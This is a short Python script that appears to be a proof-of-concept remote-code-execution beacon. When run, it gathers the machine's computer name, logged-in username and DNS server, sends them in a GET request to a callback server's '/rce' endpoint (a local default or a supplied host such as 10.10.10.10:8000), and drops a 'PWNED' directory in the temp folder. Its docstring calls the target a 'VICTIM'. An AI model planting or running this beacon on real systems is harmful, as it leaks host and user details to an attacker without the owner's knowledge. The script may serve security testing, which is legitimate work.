import os
import dns.resolver
import requests
import getpass

def main(proto=None, host=None, port=None):
    """
    MAIN FUNCTION TAKES THREE OR NONE ARGUMENTS

    If called with no arguments, it makes a GET request to the URL with the following format:
    http://127.0.0.1:3000//rce?hostname=VICTIM&username=VICTIM_USER&dns=1.1.1.1

    The URL captures the values of the current OS environment values like 'COMPUTER NAME', 'CURRENT LOGGED IN USERNAME'
    and 'DNS INFO' as per the operating system flavour that the code is currently running on.

    Once the GET request is made, it will create a directory called 'PWNED' in the %temp% location in case of a Windows
    OS environment and 'PWNED' in the /tmp location in case of a UNIX or LINUX OS.

    If called with arguments, it makes a GET request to the URL with the following format:
    http://10.10.10.10:8000//rce?hostname=VICTIM&username=VICTIM_USER&dns=1.1.1.1

    The URL captures the values of the current OS environment values like 'COMPUTER NAME', 'CURRENT LOGGED IN USERNAME'
    and 'DNS INFO' as per the operating system flavour that the code is currently running on.

    Once the GET request is made, it will create a directory called 'PWNED' in the %temp% location in case of a Windows
    OS environment and 'PWNED' in the /tmp location in case of a UNIX or LINUX OS.
    """
    if (proto and host and port) is None:
        proto = 'http'
        host = '127.0.0.1'
        port = '3000'
    else:
        pass

    url = proto + "://" + host + ":" + port
    print('Sending request...')

    if os.name == 'nt':
        hostname = os.environ['COMPUTERNAME']
        username = getpass.getuser()
        try:
            dnsd = dns.resolver.Resolver().nameservers[0]
            geturl = url + "/rce?hostname=%s&username=%s&dns=%s" % (hostname, username, dnsd)
            response = requests.get(geturl, verify=False)
        except Exception:
            pass
        temp = os.popen(" echo %temp%").read().split("Temp")[0] + "Temp\\PWNED"
        os.makedirs(temp, exist_ok=True)
    else:
        hostname = str(os.popen('hostname').read().replace("\n", ""))
        username = getpass.getuser()
        try:
            dnsd = dns.resolver.Resolver().nameservers[0]
            geturl = url + "/rce?hostname=%s&username=%s&dns=%s" % (hostname, username, dnsd)
        except Exception:
            pass
        response = requests.get(geturl, verify=False)
        os.makedirs("/tmp/PWNED", exist_ok=True)

if __name__ == '__main__':
    main()
